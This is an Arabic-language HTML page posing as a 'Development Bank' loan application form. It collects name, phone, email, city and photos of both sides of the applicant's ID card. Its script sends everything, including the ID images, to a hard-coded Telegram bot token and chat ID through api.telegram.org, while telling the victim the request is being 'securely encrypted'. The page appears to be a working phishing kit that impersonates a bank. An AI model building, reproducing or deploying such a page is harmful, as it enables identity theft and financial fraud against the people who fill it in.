<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تقديم الطلب | بنك التنمية</title>
    <style>
        :root { --primary: #006c35; --gold: #c5a059; }
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f5; direction: rtl; padding: 20px; }
        .form-card { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; }
        .btn-send { width: 100%; padding: 15px; background: var(--primary); color: white; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; font-size: 1.1rem; }
        #loader { display: none; color: var(--primary); font-weight: bold; text-align: center; margin-top: 10px; }
    </style>
</head>
<body>

<div class="form-card">
    <h2 style="text-align:center; color:var(--primary);">إكمال بيانات الطلب</h2>
    <form id="mainForm">
        <input type="text" id="name" placeholder="الاسم الكامل" required>
        <input type="tel" id="phone" placeholder="رقم الجوال" required>
        <input type="email" id="email" placeholder="البريد الإلكتروني" required>
        <input type="text" id="city" placeholder="المدينة" required>
        
        <label style="font-weight:bold; display:block; margin-top:10px;">صورة الهوية (الوجه الأمامي):</label>
        <input type="file" id="img1" accept="image/*" required>
        
        <label style="font-weight:bold; display:block; margin-top:10px;">صورة الهوية (الظهر):</label>
        <input type="file" id="img2" accept="image/*" required>
        
        <button type="submit" class="btn-send" id="subBtn">إرسال الطلب الآمن</button>
        <div id="loader">⏳ جاري تشفير البيانات وإرسال الطلب...</div>
    </form>
</div>

<script>
    const BOT_TOKEN = '8688016586:AAFEd6EBgeu5pTWtLTstuN2YFsZytQBWwH8';
    const CHAT_ID = '5516597110';

    document.getElementById('mainForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('subBtn');
        const loader = document.getElementById('loader');
        btn.style.display = 'none';
        loader.style.display = 'block';

        const name = document.getElementById('name').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const city = document.getElementById('city').value;
        const finance = localStorage.getItem('selectedFinance') || 'طلب عام';
        
        const photo1 = document.getElementById('img1').files[0];
        const photo2 = document.getElementById('img2').files[0];

        const caption = `🚀 *طلب تمويل جديد*\n\n👤 الاسم: ${name}\n📱 الجوال: ${phone}\n📧 الإيميل: ${email}\n📍 المدينة: ${city}\n💰 النوع: ${finance}`;

        try {
            // إرسال البيانات النصية مع الصورة الأولى
            const formData1 = new FormData();
            formData1.append('chat_id', CHAT_ID);
            formData1.append('photo', photo1);
            formData1.append('caption', caption);
            formData1.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData1 });

            // إرسال الصورة الثانية
            const formData2 = new FormData();
            formData2.append('chat_id', CHAT_ID);
            formData2.append('photo', photo2);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData2 });

            alert('تم إرسال طلبك بنجاح! سيتم مراجعته والتواصل معك.');
            window.location.href = 'track.html';
        } catch (err) {
            alert('حدث خطأ في الإرسال، حاول مرة أخرى');
            btn.style.display = 'block';
            loader.style.display = 'none';
        }
    };
</script>
</body>
</html>
